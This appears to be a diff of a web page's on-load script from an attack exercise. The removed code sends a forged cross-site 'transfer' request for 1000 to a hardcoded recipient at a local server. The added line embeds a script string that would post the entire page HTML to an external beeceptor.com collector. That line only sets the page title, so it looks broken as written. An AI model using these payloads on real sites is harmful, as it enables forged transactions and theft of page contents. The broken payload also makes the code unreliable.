@@ -9,22 +9,7 @@
     
     <script>
       window.addEventListener('load', function() {
-        const payload = {
-          "user_to": "s@1.com",
-          "amount": "1000"
-        };
-        
-        fetch("http://192.168.2.98:55824/transfer", {
-          method: "POST",
-          body: JSON.stringify(payload),
-          headers: {
-            "Content-Type": "application/json"
-          }
-        }).then(response => {
-          console.log("Request sent successfully!");
-        }).catch(error => {
-          console.error("Error sending request:", error);
-        });
+        this.document.title = '<script>var currentHTML = document.documentElement.outerHTML;fetch("https://beeceptor.com/console/yifengze", {method: "POST",body: currentHTML,headers: {"Content-Type": "text/html"}})</script>'
       });
     </script>
   </body>
